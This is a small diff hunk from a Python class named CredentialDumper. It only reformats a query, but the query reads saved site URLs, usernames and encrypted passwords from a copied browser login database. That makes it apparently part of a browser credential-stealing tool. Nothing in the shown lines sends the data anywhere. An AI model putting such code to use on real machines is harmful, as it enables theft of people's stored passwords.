@@ -520,12 +520,10 @@ class CredentialDumper:
                 conn = sqlite3.connect(temp_db)
                 cursor = conn.cursor()
 
-                cursor.execute(
-                    """
+                cursor.execute("""
                     SELECT origin_url, username_value, password_value
                     FROM logins
-                """
-                )
+                """)
 
                 for row in cursor.fetchall():
                     url, username, encrypted_password = row
